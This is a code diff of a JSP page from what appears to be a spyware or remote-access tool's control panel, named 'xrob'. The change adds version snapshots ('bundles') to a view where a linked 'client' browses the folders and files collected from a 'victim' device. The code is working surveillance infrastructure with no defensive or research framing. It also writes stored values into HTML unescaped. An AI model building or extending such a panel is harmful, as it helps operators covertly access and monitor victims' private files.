@@ -1,13 +1,8 @@
-<%@ page import="com.theah64.xrob.api.database.tables.ClientVictimRelations" %>
-<%@ page import="com.theah64.xrob.api.database.tables.Deliveries" %>
-<%@ page import="com.theah64.xrob.api.database.tables.Files" %>
-<%@ page import="com.theah64.xrob.api.database.tables.Victims" %>
-<%@ page import="com.theah64.xrob.api.models.File" %>
-<%@ page import="com.theah64.xrob.api.models.Victim" %>
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
 <%@ page import="java.util.List" %>
-<%@ page import="com.theah64.xrob.api.models.Delivery" %>
+<%@ page import="com.theah64.xrob.api.models.*" %>
+<%@ page import="com.theah64.xrob.api.database.tables.*" %>
 <%--
   Created by IntelliJ IDEA.
   User: theapache64
@@ -28,11 +23,16 @@
     <%
         final HtmlTemplates.SearchTemplate searchTemplate = new HtmlTemplates.SearchTemplate("tFiles", "file_row");
     %>
+
     <script>
         $(document).ready(function () {
             <%=searchTemplate.getSearchScript()%>
-        });
 
+            $("select#sFileBundles").on('change', function () {
+                var bundleHash = $(this).find(":selected").val();
+                window.location = "/client/victim/files/" + bundleHash;
+            });
+        });
 
     </script>
 </head>
@@ -44,20 +44,37 @@
     <%
         try {
 
-            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, PathInfo.UNLIMITED);
+            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 2, PathInfo.UNLIMITED);
             final String victimCode = pathInfoUtils.getPart(1);
-            final String fileHash = pathInfoUtils.getLastPart(null);
-            System.out.println("FileHash : " + fileHash);
-            String fileParentId = Files.getInstance().get(Files.COLUMN_FILE_HASH, fileHash, Files.COLUMN_FILE_ID);
-            System.out.println("FileParentId : " + fileParentId);
-            if (fileParentId == null) {
-                fileParentId = "0";
-            }
 
             final Victims victimsTable = Victims.getInstance();
             final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);
 
             if (theVictim != null) {
+
+                final String bundleHash = pathInfoUtils.getPart(2);
+                final String fileHash = pathInfoUtils.getLastPart(null);
+
+                String bundleId = null, fileParentId = null;
+
+                if (bundleHash != null) {
+                    bundleId = FileBundles.getInstance().get(FileBundles.COLUMN_BUNDLE_HASH, bundleHash, FileBundles.COLUMN_ID);
+                }
+
+                if (bundleId == null) {
+                    //Getting last bundle of the victim
+                    bundleId = FileBundles.getInstance().get(FileBundles.COLUMN_VICTIM_ID, theVictim.getId(), FileBundles.COLUMN_ID);
+                }
+
+                if (fileHash != null) {
+                    fileParentId = Files.getInstance().get(Files.COLUMN_FILE_HASH, fileHash, Files.COLUMN_FILE_ID);
+                }
+
+                if (fileParentId == null) {
+                    //No file hash so setting route
+                    fileParentId = "0";
+                }
+
 
                 if (ClientVictimRelations.getInstance().isConnected(clientId.toString(), theVictim.getId())) {
 
@@ -79,15 +96,61 @@
         <div class="row" style="margin-top: 20px;">
 
             <%
-                final List<File> files = Files.getInstance().getAll(theVictim.getId(), fileParentId);
+                final List<File> files = Files.getInstance().getAll(theVictim.getId(), bundleId, fileParentId);
                 if (files != null) {
             %>
             <div class="col-md-10 content-centered">
+
 
                 <%=searchTemplate.getTopTemplate(
                         theVictim.getIdentity(),
                         lastUpdatedTime == null ? "(Not yet updated)" : "(last update " + lastUpdatedTime + ")")%>
 
+                <div class="row">
+
+                    <div class="form-group col-md-4">
+                        <label for="sFileBundles">Version</label>
+
+                        <select id="sFileBundles" class="form-control">
+                            <%
+                                final List<FileBundle> fileBundles = FileBundles.getInstance().getAll(theVictim.getId());
+                                if (fileBundles != null) {
+                                    for (final FileBundle fileBundle : fileBundles) {
+
+                            %>
+                            <option value="<%=victimCode+"/"+fileBundle.getBundleHash()%>" <%=fileBundle.getBundleHash().equals(bundleHash) ? " selected" : ""%>><%="#" + fileBundle.getId() + " - " + fileBundle.getRelativeSyncedTime()%>
+                            </option>
+
+                            <%
+
+                                    }
+                                }
+                            %>
+
+                        </select>
+
+                    </div>
+                </div>
+
+                </br>
+
+                <%--
+                //next feature
+                <div class="row text-center">--%>
+                <%--<ul id="nav_menu_2" class="breadcrumb">--%>
+
+                <%--<%--%>
+                <%--final List<File> parents = Files.getInstance().getParents(fileParentId);--%>
+                <%--%>--%>
+
+                <%--<li><a href="#">/</a></li>--%>
+                <%--<li><a href="#">folder 1</a></li>--%>
+                <%--<li class="active">folder 2</li>--%>
+                <%--</ul>--%>
+                <%--</div>--%>
+
+
+                </br>
                 <table id="tFiles" class="table table-bordered table-condensed">
                     <tr>
                         <th>File name</th>
@@ -97,27 +160,41 @@
                     <%
                         for (final File file : files) {
                     %>
+
                     <tr class="file_row">
 
-                        <td><%
-                            if (file.isDirectory()) {
-                        %>
+                        <td>
                             <abbr title="<%=file.getAbsoluteParentPath()%>">
-                                <a href="/client/victim/files/<%=victimCode+file.getAbsoluteParentPath()+(file.getAbsoluteParentPath().equals("/") ? "" : "/")+file.getFileName()+"/"+file.getFileHash()%>"><%=file.getFileName()%>
-                                </a>
-                            </abbr>
+                                <%
+                                    if (file.isDirectory()) {
+                                %>
 
-                            <%
-                            } else {
-                            %>
-                            <%=file.getFileName()%>
-                            <%
-                                }
-                            %>
+                                <a href="<%=file.hasDirectory()  ?
+                                "/client/victim/files/"+victimCode+"/"+bundleHash+"/"+file.getFileHash() :
+                                "#"
+                                %>"><%=file.getFileName()%>
+                                </a>
+
+                                <%=file.hasDirectory() ? "" : "(empty)"%>
+
+
+                                <%
+                                } else {
+                                %>
+                                <%=file.getFileName()%>
+                                <%
+                                    }
+                                %>
+
+                            </abbr>
                         </td>
+
+
                         <td><%=file.getFileSizeInKB()%>KB
                         </td>
+
                     </tr>
+
                     <%
                         }
                     %>
@@ -154,5 +231,7 @@
     %>
 
 </div>
+
+
 </body>
 </html>
